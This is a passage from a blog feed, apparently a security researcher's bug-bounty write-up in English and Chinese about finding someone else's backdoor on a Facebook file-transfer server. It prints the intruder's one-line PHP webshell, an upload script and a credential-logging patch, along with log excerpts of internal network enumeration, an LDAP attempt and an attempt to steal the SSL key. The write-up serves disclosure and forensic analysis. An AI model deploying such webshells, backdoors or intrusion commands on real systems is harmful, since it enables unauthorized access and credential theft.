  &lt;li&gt;When the hacker was sending out commands, he didn’t take care of STDERR, and left a lot of command error messages in web log which the hacker’s operations could be seen&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
From access.log, every few days the hacker will clear all the credentials he logged&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-prolog&quot; data-lang=&quot;prolog&quot;&gt;&lt;span class=&quot;mf&quot;&gt;192.168.54.13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;17955&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Sat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Jan&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2016&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;s-Atom&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;s-Atom&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0000&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1453575850&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;GET /courier/custom_template/1000/bN3dl0Aw.php?c=./sshpass -p &amp;#39;********&amp;#39; ssh -v -o StrictHostKeyChecking=no soggycat@localhost &amp;#39;cp /home/seos/courier/B3dKe9sQaa0L.log /home/seos/courier/B3dKe9sQaa0L.log.2; echo &amp;gt; /home/seos/courier/B3dKe9sQaa0L.log&amp;#39; 2&amp;gt;/dev/stdout HTTP/1.1&amp;quot;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2559&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Packing files&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cat tmp_list3_2 &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;line&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; cp /home/filex2/1000/&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt; files&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; 2&amp;gt;/dev/stdout
tar -czvf files.tar.gz files&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Enumerating internal network architecture&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-tex&quot; data-lang=&quot;tex&quot;&gt;dig a archibus.thefacebook.com
telnet archibus.facebook.com 80
curl http://archibus.thefacebook.com/spaceview&lt;span class=&quot;nb&quot;&gt;_&lt;/span&gt;facebook/locator/room.php
dig a records.fb.com
telnet records.fb.com 80
telnet records.fb.com 443
wget -O- -q http://192.168.41.16
dig a acme.facebook.com
./sshpass -p &amp;#39;********&amp;#39; ssh -v -o StrictHostKeyChecking=no soggycat@localhost &amp;#39;for i in &lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;201&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;; do for j in &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;(seq 0 1 255); do echo &amp;quot;192.168.&lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;i.&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;j:`dig +short ptr &lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;j.&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;i.168.192.in-addr.arpa`&amp;quot;; done; done&amp;#39; 2&amp;gt;/dev/stdout
...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Use ShellScript to scan internal network but forgot to redirect STDERR XD&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20160421/6.jpg&quot; alt=&quot;Port Scanning&quot; /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Attempt to connect internal LDAP server&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-tex&quot; data-lang=&quot;tex&quot;&gt;sh: -c: line 0: syntax error near unexpected token `(&amp;#39;
sh: -c: line 0: `ldapsearch -v -x -H ldaps://ldap.thefacebook.com -b CN=svc-accellion,OU=Service Accounts,DC=thefacebook,DC=com -w &amp;#39;********&amp;#39; -s base (objectclass=*) 2&amp;gt;/dev/stdout&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Attempt to access internal server   &lt;br /&gt;
(Looked like Mail OWA could be accessed directly…)&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;--20:38:09--  https://mail.thefacebook.com/
Resolving mail.thefacebook.com... 192.168.52.37
Connecting to mail.thefacebook.com|192.168.52.37|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://mail.thefacebook.com/owa/ [following]
--20:38:10--  https://mail.thefacebook.com/owa/
Reusing existing connection to mail.thefacebook.com:443.
HTTP request sent, awaiting response... 302 Moved Temporarily
Location: https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;amp;reason=0 [following]
--20:38:10--  https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;amp;reason=0
Reusing existing connection to mail.thefacebook.com:443.
HTTP request sent, awaiting response... 200 OK
Length: 8902 (8.7K) [text/html]
Saving to: `STDOUT&amp;#39;

     0K ........                                              100% 1.17G=0s

20:38:10 (1.17 GB/s) - `-&amp;#39; saved [8902/8902]

--20:38:33--  (try:15)  https://10.8.151.47/
Connecting to 10.8.151.47:443... --20:38:51--  https://svn.thefacebook.com/
Resolving svn.thefacebook.com... failed: Name or service not known.
--20:39:03--  https://sb-dev.thefacebook.com/
Resolving sb-dev.thefacebook.com... failed: Name or service not known.
failed: Connection timed out.
Retrying.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Attempt to steal SSL Private Key&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
ls: /etc/opt/apache/ssl.key/server.key: No such file or directory
mv: cannot stat `x&amp;#39;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&amp;#39;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&amp;#39;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&amp;#39;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&amp;#39;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
base64: invalid input&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;After checking the browser, the SSL certificate of files.fb.com was *.fb.com …&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/7.jpg&quot; alt=&quot;certificate of files.fb.com&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;epilogue&quot;&gt;Epilogue&lt;/h3&gt;

&lt;p&gt;After adequate proofs had been collected, they were immediately reported to Facebook Security Team. Other than vulnerability details accompanying logs, screenshots and timelines were also submitted xD&lt;/p&gt;

&lt;p&gt;Also, from the log on the server, there were two periods that the system was obviously operated by the hacker, one in the beginning of July and one in mid-September&lt;/p&gt;

&lt;p&gt;the July one seemed to be a server “dorking” and the September one seemed more vicious. Other than server “dorking” keyloggers were also implemented. As for the identities of these two hackers, were they the same person? Your guess is as good as mine. :P  &lt;br /&gt;
The time July incident happened to take place right before the announcement of CVE-2015-2857 exploit. Whether it was an invasion of 1-day exploitation or unknown 0-day ones were left in question.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Here’s the end of the story, and, generally speaking, it was a rather interesting experience xD  &lt;br /&gt;
Thanks to this event, it inspired me to write some articles about penetration :P&lt;/p&gt;

&lt;p&gt;Last but not least, I would like to thank Bug Bounty and tolerant Facebook Security Team so that I could fully write down this incident : )&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;2016/02/05 20:05 Provide vulnerability details to Facebook Security Team&lt;/li&gt;
  &lt;li&gt;2016/02/05 20:08 Receive automatic response&lt;/li&gt;
  &lt;li&gt;2016/02/06 05:21 Submit vulnerability Advisory to Accellion Support Team&lt;/li&gt;
  &lt;li&gt;2016/02/06 07:42 Receive response from Thomas that inspection is in progress&lt;/li&gt;
  &lt;li&gt;2016/02/13 07:43 Receive response from Reginaldo about receiving Bug Bounty award $10000 USD&lt;/li&gt;
  &lt;li&gt;2016/02/13 Asking if there anything I should pay special attention to in blog post ?&lt;/li&gt;
  &lt;li&gt;2016/02/13 Asking Is this vulnerability be classify as a RCE or SQL Injection ?&lt;/li&gt;
  &lt;li&gt;2016/02/18 Receive response from Reginaldo about there is a forensics investigation, Would you be able to hold your blog post until this process is complete?&lt;/li&gt;
  &lt;li&gt;2016/02/24 Receive response from Hai about the bounty will include in March payments cycle.&lt;/li&gt;
  &lt;li&gt;2016/04/20 Receive response from Reginaldo about the forensics investigation is done&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/</link>
                <guid>https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver</guid>
                <pubDate>Thu, 21 Apr 2016 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>滲透 Facebook 的思路與發現</title>
                <description>&lt;p&gt;by &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;How I Hacked Facebook, and Found Someone’s Backdoor Script&lt;/a&gt; (English Version)  &lt;br /&gt;
&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/&quot;&gt;滲透 Facebook 的思路與發現&lt;/a&gt; (中文版本)&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;寫在故事之前&quot;&gt;寫在故事之前&lt;/h3&gt;

&lt;p&gt;身為一位滲透測試人員，比起 Client Side 的弱點我更喜歡 Server Side 的攻擊，能夠直接的控制伺服器、獲得權限操作 SHELL 才爽 &amp;lt;(￣︶￣)&amp;gt;&lt;/p&gt;

&lt;p&gt;當然一次完美的滲透任何形式的弱點都不可小覷，在實際滲透時偶爾還是需要些 Client Side 弱點組合可以更完美的控制伺服器，但是在尋找弱點時我本身還是先偏向以可直接進入伺服器的方式來去尋找風險高、能長驅直入的弱點。&lt;/p&gt;

&lt;p&gt;隨著 Facebook 在世界上越來越火紅、用戶量越來越多，一直以來都有想要嘗試看看的想法，恰巧 Facebook 在 2012 年開始有了 &lt;a href=&quot;https://www.facebook.com/whitehat/&quot;&gt;Bug Bounty&lt;/a&gt; 獎金獵人的機制讓我更躍躍欲試。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;一般如由滲透的角度來說習慣性都會從收集資料、偵查開始，首先界定出目標在網路上的 “範圍” 有多大，姑且可以評估一下從何處比較有機會下手。例如:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Google Hacking 到什麼資料?&lt;/li&gt;
  &lt;li&gt;用了幾個 B 段的 IP ? C 段的 IP ?&lt;/li&gt;
  &lt;li&gt;Whois? Reverse Whois?&lt;/li&gt;
  &lt;li&gt;用了什麼域名? 內部使用的域名? 接著做子域名的猜測、掃描&lt;/li&gt;
  &lt;li&gt;公司平常愛用什麼樣技術、設備?&lt;/li&gt;
  &lt;li&gt;在 Github, Pastebin 上是否有洩漏什麼資訊?&lt;/li&gt;
  &lt;li&gt;…etc&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;當然 Bug Bounty 並不是讓你無限制的攻擊，將所蒐集到的範圍與 Bug Bounty 所允許的範圍做交集後才是你真正可以去嘗試的目標。&lt;/p&gt;

&lt;p&gt;一般來說大公司在滲透中比較容易出現的問題點這裡舉幾個例子來探討&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;對多數大公司而言，”&lt;strong&gt;網路邊界&lt;/strong&gt;” 是比較難顧及、容易出現問題的一塊，當公司規模越大，同時擁有數千、數萬台機器在線，網管很難顧及到每台機器。在攻防裡，防守要防的是一個面，但攻擊只需找個一個點就可以突破，所以防守方相對處於弱勢，攻擊者只要找到一台位於網路邊界的機器入侵進去就可以開始在內網進行滲透了!&lt;/li&gt;
  &lt;li&gt;對於 “&lt;strong&gt;連網設備&lt;/strong&gt;” 的安全意識相對薄弱，由於連網設備通常不會提供 SHELL 給管理員做進一步的操作，只能由設備本身所提供的介面設定，所以通常對於設備的防禦都是從網路層來抵擋，但如遇到設備本身的 0-Day 或者是 1-Day 可能連被入侵了都不自覺。&lt;/li&gt;
  &lt;li&gt;人的安全，隨著 “&lt;strong&gt;社工庫&lt;/strong&gt;” 的崛起，有時可以讓一次滲透的流程變得異常簡單，從公開資料找出公司員工列表，再從社工庫找到可以登入 VPN 的員工密碼就可以開始進行內網滲透，尤其當社工庫數量越來越多 “&lt;strong&gt;量變成質變&lt;/strong&gt;” 時只要關鍵人物的密碼在社工庫中可找到，那企業的安全性就全然突破 :P&lt;br /&gt;
&lt;br /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;理所當然在尋找 Facebook 弱點時會以平常進行滲透的思路進行，在開始搜集資料時除了針對 Facebook 本身域名查詢外也對註冊信箱進行 Reverse Whois 意外發現了個奇妙的域名名稱&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tfbnw.net
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;TFBNW 似乎是 “&lt;strong&gt;TheFacebook Network&lt;/strong&gt;” 的縮寫  &lt;br /&gt;
再藉由公開資料發現存在下面這台這台伺服器&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vpn.tfbnw.net
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;哇! vpn.tfbnw.net 看起來是個 Juniper SSL VPN 的登入介面，不過版本滿新的沒有直接可利用的弱點，不過這也成為了進入後面故事的開端。&lt;/p&gt;

&lt;p&gt;TFBNW 看似是 Facebook 內部用的域名，來掃掃 vpn.tfbnw.net 同網段看會有什麼發現&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Mail Server Outlook Web App&lt;/li&gt;
  &lt;li&gt;F5 BIGIP SSL VPN&lt;/li&gt;
  &lt;li&gt;CISCO ASA SSL VPN&lt;/li&gt;
  &lt;li&gt;Oracle E-Business&lt;/li&gt;
  &lt;li&gt;MobileIron MDM&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;從這幾台機器大致可以判斷這個網段對於 Facebook 來說應該是相對重要的網段，之後一切的故事就從這裡開始。&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;弱點發現&quot;&gt;弱點發現&lt;/h3&gt;

&lt;p&gt;在同網段中，發現一台特別的伺服器&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;files.fb.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/1.jpg&quot; alt=&quot;files.fb.com&quot; /&gt;&lt;br /&gt;
&lt;em&gt;↑ files.fb.com 登入介面&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;從 LOGO 以及 Footer 判斷應該是 Accellion 的 Secure File Transfer (以下簡稱 FTA)&lt;/p&gt;

&lt;p&gt;FTA 為一款標榜安全檔案傳輸的產品，可讓使用者線上分享、同步檔案，並整合 AD, LDAP, Kerberos 等 Single Sign-on 機制，Enterprise 版本更支援 SSL VPN 服務。&lt;/p&gt;

&lt;p&gt;首先看到 FTA 的第一件事是去網路上搜尋是否有公開的 Exploit 可以利用，Exploit 最近的是由 HD Moore 發現並發佈在 Rapid7 的這篇 Advisory&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857&quot;&gt;Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;弱點中可直接從 “&lt;strong&gt;/tws/getStatus&lt;/strong&gt;” 中洩漏的版本資訊判斷是否可利用，在發現 files.fb.com 時版本已從有漏洞的 0.18 升級至 0.20 了，不過就從 Advisory 中所透露的片段程式碼感覺 FTA 的撰寫風格如果再繼續挖掘可能還是會有問題存在的，所以這時的策略便開始往尋找 FTA 產品的 0-Day 前進!&lt;/p&gt;

&lt;p&gt;不過從實際黑箱的方式其實找不出什麼問題點只好想辦法將方向轉為白箱測試，透過各種方式拿到舊版的 FTA 原始碼後終於可以開始研究了!&lt;/p&gt;

&lt;p&gt;整個 FTA 產品大致架構&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;網頁端介面主要由 Perl 以及 PHP 構成&lt;/li&gt;
  &lt;li&gt;PHP 原始碼皆經過 IonCube 加密&lt;/li&gt;
  &lt;li&gt;在背景跑了許多 Perl 的 Daemon&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;首先是解密 IonCude 的部分，許多設備為了防止自己的產品被檢視所以會將原始碼加密，不過好在 FTA 上的 IonCude 版本沒到最新，可以使用現成的工具解密，不過由於 PHP 版本的問題，細節部份以及數值運算等可能要靠自己修復一下，不然有點難看…&lt;/p&gt;

&lt;p&gt;經過簡單的原始碼審查後發現，好找的弱點應該都被 Rapid7 找走了 T^T  &lt;br /&gt;
而需要認證才能觸發的漏洞又不怎麼好用，只好認真點往深層一點的地方挖掘!&lt;/p&gt;

&lt;p&gt;經過幾天的認真挖掘，最後總共發現了七個弱點，其中包含了&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Cross-Site Scripting x 3&lt;/li&gt;
  &lt;li&gt;Pre-Auth SQL Injection leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Known-Secret-Key leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Local Privilege Escalation x 2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;除了回報 Facebook 安全團隊外，其餘的弱點也製作成 Advisory 提交 Accellion 技術窗口，經過廠商修補提交 CERT/CC 後取得四個 CVE 編號&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2016-2350&lt;/li&gt;
  &lt;li&gt;CVE-2016-2351&lt;/li&gt;
  &lt;li&gt;CVE-2016-2352&lt;/li&gt;
  &lt;li&gt;CVE-2016-2353&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;詳細的弱點細節會待 Full Disclosure Policy 後公布!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/2.jpg&quot; alt=&quot;shell on facebook&quot; /&gt;&lt;br /&gt;
&lt;em&gt;↑ 使用 Pre-Auth SQL Injection 寫入 Webshell&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;在實際滲透中進去伺服器後的第一件事情就是檢視當前的環境是否對自己友善，為了要讓自己可以在伺服器上待的久就要盡可能的了解伺服器上有何限制、紀錄，避開可能會被發現的風險 :P&lt;/p&gt;

&lt;p&gt;Facebook 大致有以下限制:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;防火牆無法連外, TCP, UDP, 53, 80, 443 皆無法&lt;/li&gt;
  &lt;li&gt;存在遠端的 Syslog 伺服器&lt;/li&gt;
  &lt;li&gt;開啟 Auditd 記錄&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;無法外連看起來有點麻煩，但是 ICMP Tunnel 看似是可行的，但這只是一個 Bug Bounty Program 其實不需要太麻煩就純粹以 Webshell 操作即可。&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;似乎有點奇怪&quot;&gt;似乎有點奇怪?&lt;/h3&gt;

&lt;p&gt;正當收集證據準備回報 Facebook 安全團隊時，從網頁日誌中似乎看到一些奇怪的痕跡。&lt;/p&gt;

&lt;p&gt;首先是在 “&lt;strong&gt;/var/opt/apache/php_error_log&lt;/strong&gt;” 中看到一些奇怪的 PHP 錯誤訊息，從錯誤訊息來看似乎像是邊改 Code 邊執行所產生的錯誤?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/3.jpg&quot; alt=&quot;PHP error log&quot; /&gt;&lt;br /&gt;
&lt;em&gt;↑ PHP error log&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
跟隨錯誤訊息的路徑去看發現疑似前人留下的 Webshell 後門&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/4.jpg&quot; alt=&quot;Webshell on facebook server&quot; /&gt;&lt;br /&gt;
&lt;em&gt;↑ Webshell on facebook server&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;其中幾個檔案的內容如下&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;sshpass&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;沒錯，就是那個 &lt;a href=&quot;http://linux.die.net/man/1/sshpass&quot;&gt;sshpass&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;div class=&quot;highlight-name&quot;&gt;bN3d10Aw.php&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;highlight-name&quot;&gt;uploader.php&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;move_uploaded_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;f][&amp;quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tmp_name&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;], basename(&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$_FILES[&amp;quot;f&amp;quot;]&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[&amp;quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;])); ?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;highlight-name&quot;&gt;d.php&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;include_oncce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/home/seos/courier/remote.inc&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;c&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;highlight-name&quot;&gt;sclient\_user\_class\_standard.inc&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;include_once&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;sclient_user_class_standard.inc.orig&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/home/seos/courier/B3dKe9sQaa0L.log&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
&lt;span class=&quot;nv&quot;&gt;$retries&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$max_retries&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 

